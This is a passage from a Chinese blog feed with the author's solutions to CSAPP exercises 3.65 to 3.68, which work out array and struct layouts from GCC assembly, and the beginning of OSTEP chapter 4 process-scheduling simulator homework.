      <span class="token keyword">long</span> t <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
      A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
      A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>当用优化等级-O1编译时，GCC为这个函数的内循环产生下面的代码：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">.L6
  movq (%rdx), %rcx
  movq (%rax), %rsi
  movq %rsi, (%rdx)
  movq %rcx, (%rax)
  addq $8, %rdx
  addq $120, %rax
  cmpq %rdi, %rax
  jne .L6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br> 我们可以看到GCC把数组索引转换成了指针代码</p>
<ul>
<li>A. 哪个寄存器保存着指向数组元素A[i][j]的指针？</li>
<li>B. 哪个寄存器保存着指向数组元素A[j][i]的指针？</li>
<li>C. $M$的值是多少</li>
</ul>
</blockquote>
<p>既然要表示索引，那每次循环都要增加，两个立即数，8和120简直明示答案了，$M$= 15，rdx跟着j走，rax跟着i，这样指向A[i][j]的指针就是rdx，A[j][i]的就是rax，秒了</p>
<p>检验一下$M$<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">M</span> <span class="token expression"><span class="token number">15</span></span></span>
<span class="token keyword">void</span> <span class="token function">transpose</span><span class="token punctuation">(</span><span class="token keyword">long</span> A<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> M<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">long</span> t <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
        A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">.L2:
movq(%rax), %rdx
movq(%rdi), %rcx
movq%rcx, (%rax)
movq%rdx, (%rdi)
addq$120, %rax
addq$8, %rdi
cmpq%rsi, %rax
jne.L2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>寄存器的使用完全不一样，但无所谓，120对了就说明$M$没错</p>
<h2 id="题目-3-66"><a href="#题目-3-66" class="headerlink" title="题目 *3.66"></a>题目 *3.66</h2><blockquote>
<p>考虑下面的源代码，这里$NR$和$NC$是用#define定义的宏表达式，计算用参数$n$表示的矩阵$A$的维度。这段代码计算矩阵的第j列的元素之和<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">sum_col</span><span class="token punctuation">(</span><span class="token keyword">long</span> n<span class="token punctuation">,</span> <span class="token keyword">long</span> A<span class="token punctuation">[</span><span class="token function">NR</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token function">NC</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">long</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> i<span class="token punctuation">;</span>
  <span class="token keyword">long</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token function">NR</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      result <span class="token operator">+=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>编译这个程序，GCC产生下面的汇编代码：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">sum_col:
  leaq    1(,%rdi,4), %r8     ;r8 &#x3D; 4n + 1
  leaq    (%rdi,%rdi，2), %rax;rax &#x3D; 3n
  movq    %rax, %rdi          ;rdi &#x3D; 3n
  testq   %rax, %rax          ;按位与rax，设置符号位
  jle .L4                     ;如果小于等于，也就是0标志位为1 或 符号位为1，也就是rax &lt;&#x3D; 0，就跳转到L4
  salq    $3, %r8             ;r8 *&#x3D; 2^3 ; r8 &#x3D; 8(4n + 1)
  leaq    (%rsi,%rdx,8), %rcx ;rcx &#x3D; rsi + 8 * rdx 
  movl    $0, %eax;           ;eax &#x3D; 0
  movl    $0, %edx;           ;edx &#x3D; 0
.L3:
  addq    (%rcx), %rax        ;rax &#x3D; (rcx)
  addq    $1, %rdx            ;rdx +&#x3D; 1
  addq    %r8, %rcx           ;rcx +&#x3D; r8
  cmpq    %rdi, %rdx          ;
  jne     .L3                 如果rdi和rdx不相等就回到L3
  req; ret
.L4:
  movl    $0,%eax             
  ret                         ;return 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>运用你的逆向工程技术，确定$NR$和$NC$的定义</p>
</blockquote>
<p>看L4会发现直接return 0了，也就是说3n &lt;= 0就返回0，那NR(n)就是3n了</p>
<p>循环主体是L3，循环条件时rdx和rdi不相等，rdx每次加一，是索引i，那rdi就是NR(n)，往上找rdi的值，和刚才的猜测符合</p>
<p>接下来确定RC(x)，其确定了索引前移的步长，又是找索引，r8 = 8(4n + 1)，8是一个long的字节数，那RC(x)就是4n+1呗</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">NR</span><span class="token expression"><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">NC</span><span class="token expression"><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span></span></span>

<span class="token keyword">long</span> <span class="token function">sum_col</span><span class="token punctuation">(</span><span class="token keyword">long</span> n<span class="token punctuation">,</span> <span class="token keyword">long</span> A<span class="token punctuation">[</span><span class="token function">NR</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token function">NC</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">long</span> j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> i<span class="token punctuation">;</span>
    <span class="token keyword">long</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">NR</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        result <span class="token operator">+=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试时出了意外，二维数组作为参数时，大小不支持由一个不确定的表达式来表示<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-S</span> <span class="token number">3.66</span>.c <span class="token parameter variable">-o</span> <span class="token number">3.66</span>.s <span class="token parameter variable">-O1</span> <span class="token parameter variable">-std</span><span class="token operator">=</span>c99<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>这样就可以了<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">sum_col:
.LFB13:
.cfi_startproc
endbr64
leaq1(,%rdi,4), %r8
testq%rdi, %rdi
jle.L4
salq$3, %r8
leaq(%rsi,%rdx,8), %rdx
leaq(%rdi,%rdi,2), %rsi
movl$0, %ecx
movl$0, %eax
.L3:
addq(%rdx), %rcx
addq$1, %rax
addq%r8, %rdx
cmpq%rsi, %rax
jne.L3
.L1:
movq%rcx, %rax
ret
.L4:
movl$0, %ecx
jmp.L1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>寄存器不一样，计算顺序也不太一样，但是逻辑等价，过</p>
<h2 id="题目-3-67"><a href="#题目-3-67" class="headerlink" title="题目**3.67"></a>题目**3.67</h2><blockquote>
<p>这个作业要查看GCC为参数和返回值中有结构的函数产生的代码，由此可看到这些语言特性通常是如何实现的。<br>下面的C代码中有一个函数process，它用结构作为参数和返回值，还有一个函数eval，它调用process：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">long</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>strA<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> u<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">long</span> q<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>strB<span class="token punctuation">;</span>

strB <span class="token function">process</span><span class="token punctuation">(</span>strA s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  strB r<span class="token punctuation">;</span>
  r<span class="token punctuation">.</span>u<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">.</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  r<span class="token punctuation">.</span>u<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">.</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  r<span class="token punctuation">.</span>q <span class="token operator">=</span> <span class="token operator">*</span>s<span class="token punctuation">.</span>p<span class="token punctuation">;</span>
  retrun r<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">long</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">long</span> y<span class="token punctuation">,</span> <span class="token keyword">long</span> z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  strA s<span class="token punctuation">;</span>
  s<span class="token punctuation">.</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>
  s<span class="token punctuation">.</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">;</span>
  s<span class="token punctuation">.</span>p <span class="token operator">=</span> <span class="token operator">&amp;</span>z<span class="token punctuation">;</span>
  strB r<span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  retrun r<span class="token punctuation">.</span>u<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>u<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>q<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>GCC为这两个函数产生下面的代码：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">process: 
  movq    %rdi, %rax          ;rax &#x3D; rdi
  movq    24(%rsp), %rdx      ;rdx &#x3D; &amp;z
  movq    (%rdx), %rdx        ;rdx &#x3D; *(&amp;z) &#x3D; q
  movq    16(%rsp), %rcx      ;rcx &#x3D; s.a[1]
  movq    %rcx, (%rdi)        ;*rdi &#x3D; rcx &#x3D; s.a[1] 
  movq    8(%rsp), %rcx       ;rcx &#x3D; s.a[0]
  movq    %rcx, 8(%rdi)       ;*rdi + 8 &#x3D; s.a[0]
  movq    %rdx, 16(%rdi)      ;*rdi + 16 &#x3D; rdx &#x3D; q
  ret

eval:
  subq    $104, %rsp          ;rsp回退13*8，开始存参数
  movq    %rdx, 24(%rsp)      ;s.p &#x3D; z
  leaq    24(%rsp), %rax      ;rax &#x3D; &amp;z
  movq    %rdi, (%rsp)        ;s.a[0] &#x3D; x
  movq    %rsi, 8(%rsp)       ;s.a[1] &#x3D; y
  movq    %rax, 16(%rsp)      ;s.p &#x3D; &amp;z
  leaq    64(%rsp), %rdi      ;首地址存在rsp + 64
  call    process             ;调用函数，传入了rdi，也就是结构体首地址，这里rsp - 8
  movq    72(%rsp), %rax      ;局部变量
  addq    64(%rsp), %rax      
  addq    80(%rsp), %rax      ;r.u[0] + r.u[1] + r.q
  addq    $104, %rsp          ;恢复栈指针
  ret    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<ul>
<li>A.从eval函数的第2行我们可以看到，它在栈上分配了104个字节。画出eval的栈帧，给出它在调用process前储存在栈上的值</li>
<li>B.eval调用process时传递了什么值？</li>
<li>C.process的代码是如何访问结构参数s的元素的？</li>
<li>D.process的代码是如何设置结果结构r的字段的？</li>
<li>E.完成eval的栈帧图，给出在从process返回后eval是如何访问结构r的元素的</li>
<li>F.就如何传递作为函数参数的结构以及如何返回作为函数结果的结构值，你可以看出什么通用的原则？</li>
</ul>
</blockquote>
<p>好久没见到rsp了，前面的题基本都是几个寄存器就解决了。正常来说函数的参数按照一定约定存在寄存器里，而此题显然是把参数压入栈了，但是process函数偏偏还在用rdi</p>
<p>逐步分析流程（题目汇编代码的注释）</p>
<p>C.借助栈指针rsp与一定的偏移量<br>D.rdi是指针，存在其指向的地址里，然后返回<br>E.借助rdi，eval调用process时把rdi设置成rsp+64，返回后，借助rsp访问原本存在rdi里的值<br>F.函数作为参数：把结构体内容压入栈，再传入指针放到寄存器，借助指针访问栈；返回作为结果的结构值：借助指针，返回指向结构体的指针在rax里</p>
<p>栈帧略</p>
<h2 id="题目-3-68"><a href="#题目-3-68" class="headerlink" title="题目***3.68"></a>题目***3.68</h2><blockquote>
<p>在下面的代码中，$A$和$B$都是用#define定义的常数：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> x<span class="token punctuation">[</span>A<span class="token punctuation">]</span><span class="token punctuation">[</span>B<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">long</span> y<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>str1<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> array<span class="token punctuation">[</span>B<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> t<span class="token punctuation">;</span>
  <span class="token keyword">short</span> s<span class="token punctuation">[</span>A<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">long</span> u<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>str2<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">setVal</span><span class="token punctuation">(</span>str1 <span class="token operator">*</span>p<span class="token punctuation">,</span> str2 <span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> v1 <span class="token operator">=</span> q<span class="token operator">-></span>t<span class="token punctuation">;</span>
  <span class="token keyword">long</span> v2 <span class="token operator">=</span> q<span class="token operator">-></span>u<span class="token punctuation">;</span>
  p<span class="token operator">-></span>y <span class="token operator">=</span> v1 <span class="token operator">+</span> v2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>GCC为setVal产生下面的代码：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">setVal:
  movslq  8(%rsi), %rax
  addq    32(%rsi), %rax
  movq    %rax, 184(%rdi)
  ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>很简短的一道题，复杂度也不高，但是确实三颗星</p>
</blockquote>
<p>开猜，B = 8，A = 8 ————8和32都碰上了，但是184没有<br>184 = 4 <em> 46， 46 = 2 </em> 23，如果把A和B分别设置成2和23,184字节的偏移正确但是8和32两个偏移不对</p>
<p>尝试2，23时意外碰上了32这个偏移，仔细一看原来是对齐，提醒我们此题的数字是因为要求的四字节对齐产生的</p>
<p>考虑对齐的话：<br>$<br>43 \leq A \cdot B \leq 46 ，<br>$<br>$<br>5 \leq B \leq 8，<br>$<br>$<br>29 \leq B + 5 + 2A \leq 32<br>$</p>
<p>题目说只有唯一解，开猜：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">A</span> <span class="token expression"><span class="token number">9</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">B</span> <span class="token expression"><span class="token number">5</span></span></span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> x<span class="token punctuation">[</span>A<span class="token punctuation">]</span><span class="token punctuation">[</span>B<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span> y<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>str1<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> array<span class="token punctuation">[</span>B<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> t<span class="token punctuation">;</span>
    <span class="token keyword">short</span> s<span class="token punctuation">[</span>A<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span> u<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>str2<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">setVal</span><span class="token punctuation">(</span>str1 <span class="token operator">*</span>p<span class="token punctuation">,</span> str2 <span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> v1 <span class="token operator">=</span> q<span class="token operator">-></span>t<span class="token punctuation">;</span>
    <span class="token keyword">long</span> v2 <span class="token operator">=</span> q<span class="token operator">-></span>u<span class="token punctuation">;</span>
    p<span class="token operator">-></span>y <span class="token operator">=</span> v1 <span class="token operator">+</span> v2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">.LFB0:
.cfi_startproc
endbr64
movslq8(%rsi), %rax
addq32(%rsi), %rax
movq%rax, 184(%rdi)
ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>一致，得解</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;题目-3-58&quot;&gt;&lt;a href=&quot;#题目-3-58&quot; class=&quot;headerlink&quot; title=&quot;题目 *3.58&quot;&gt;&lt;/a&gt;题目 *3.58&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;一个函数的原型为：&lt;br&gt;&lt;pre</summary>
        
      
    
    
    
    <category term="CSAPP" scheme="https://aucept.in/categories/CSAPP/"/>
    
    
    <category term="CSAPP" scheme="https://aucept.in/tags/CSAPP/"/>
    
    <category term="汇编" scheme="https://aucept.in/tags/%E6%B1%87%E7%BC%96/"/>
    
    <category term="逆向" scheme="https://aucept.in/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP-第四章</title>
    <link href="https://aucept.in/2025/06/24/OSTEP-%E7%AC%AC%E5%9B%9B%E7%AB%A0/"/>
    <id>https://aucept.in/2025/06/24/OSTEP-%E7%AC%AC%E5%9B%9B%E7%AB%A0/</id>
    <published>2025-06-24T13:23:55.000Z</published>
    <updated>2025-06-24T13:26:02.392Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第四章课后题"><a href="#第四章课后题" class="headerlink" title="第四章课后题"></a>第四章课后题</h1><blockquote>
<p>课后实验在github上——指导书纯英文无汉化，罢了罢了</p>
</blockquote>
<h2 id="第1题"><a href="#第1题" class="headerlink" title="第1题"></a><strong>第1题</strong></h2><p>&gt;</p>
<blockquote>
<p>用以下标志运行程序：<code>./process-run.py -l 5:100,5:100</code></p>
<p>CPU 利用率（CPU 使用时间的百分比）应该是多少？为什么你知道这一点？</p>
<p>利用 <code>-c</code> 标记查看你的答案是否正确。</p>
</blockquote>
<p>先看一眼README，说此程序是用来看进程状态是如何随着运行变化的，列出了四种状态，running ready blocked done，<br>输入操作数和CPU占比，模拟os的实际时间片分配</p>
<p>回到题目，指令的意思是两个进程，各5条指令，不涉及io操作，cpu使用率还是100%<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Time        PID: <span class="token number">0</span>        PID: <span class="token number">1</span>           CPU           IOs
  <span class="token number">1</span>        RUN:cpu         READY             <span class="token number">1</span>
  <span class="token number">2</span>        RUN:cpu         READY             <span class="token number">1</span>
  <span class="token number">3</span>        RUN:cpu         READY             <span class="token number">1</span>
  <span class="token number">4</span>        RUN:cpu         READY             <span class="token number">1</span>
  <span class="token number">5</span>        RUN:cpu         READY             <span class="token number">1</span>
  <span class="token number">6</span>           DONE       RUN:cpu             <span class="token number">1</span>
  <span class="token number">7</span>           DONE       RUN:cpu             <span class="token number">1</span>
  <span class="token number">8</span>           DONE       RUN:cpu             <span class="token number">1</span>
  <span class="token number">9</span>           DONE       RUN:cpu             <span class="token number">1</span>
 <span class="token number">10</span>           DONE       RUN:cpu             <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>没问题</p>
<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a><strong>第二题</strong></h2><blockquote>
<p>现在用这些标志运行：./process-run.py -l 4:100,1:0。这些标志指定了一个包含 4 条指令的进程（都要使用 CPU），并且只是简单地发出 I/O 并等待它完成。完成这两个进程需要<br>多长时间？利用-c 检查你的答案是否正确。</p>
</blockquote>
<p>两个进程，第一个4指令无io，4时钟周期，另一个是一个io指令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> <span class="token comment"># python ./process-run.py -l 4:100,1:0</span>
Produce a trace of what would happen when you run these processes:
Process <span class="token number">0</span>
  cpu
  cpu
  cpu
  cpu

Process <span class="token number">1</span>
  io
  io_done

Important behaviors:
  System will switch when the current process is FINISHED or ISSUES AN IO
  After IOs, the process issuing the IO will run LATER <span class="token punctuation">(</span>when it is its turn<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>也就是说一个io需要发起异常、完成两个时间周期，以及一个io操作？<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#  python ./process-run.py -l 4:100,1:0 -c</span>
Time        PID: <span class="token number">0</span>        PID: <span class="token number">1</span>           CPU           IOs
  <span class="token number">1</span>        RUN:cpu         READY             <span class="token number">1</span>
  <span class="token number">2</span>        RUN:cpu         READY             <span class="token number">1</span>
  <span class="token number">3</span>        RUN:cpu         READY             <span class="token number">1</span>
  <span class="token number">4</span>        RUN:cpu         READY             <span class="token number">1</span>
  <span class="token number">5</span>           DONE        RUN:io             <span class="token number">1</span>
  <span class="token number">6</span>           DONE       BLOCKED                           <span class="token number">1</span>
  <span class="token number">7</span>           DONE       BLOCKED                           <span class="token number">1</span>
  <span class="token number">8</span>           DONE       BLOCKED                           <span class="token number">1</span>
  <span class="token number">9</span>           DONE       BLOCKED                           <span class="token number">1</span>
 <span class="token number">10</span>           DONE       BLOCKED                           <span class="token number">1</span>
 <span class="token number">11</span>*          DONE   RUN:io_done             <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>CPU用时6,周期，等待io阻塞了5周期，累积是11周期</p>
<h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a><strong>第三题</strong></h2><blockquote>
<p>现在交换进程的顺序：./process-run.py -l 1:0,4:100。现在发生了什么？交换顺序是否<br>重要？为什么？同样，用-c 看看你的答案是否正确。</p>
</blockquote>
<p>应该是在阻塞期间运行了无io的进程，直接看答案吧：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python ./process-run.py -l 1:0,4:100 -c</span>

Time        PID: <span class="token number">0</span>        PID: <span class="token number">1</span>           CPU           IOs
  <span class="token number">1</span>         RUN:io         READY             <span class="token number">1</span>
  <span class="token number">2</span>        BLOCKED       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">3</span>        BLOCKED       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
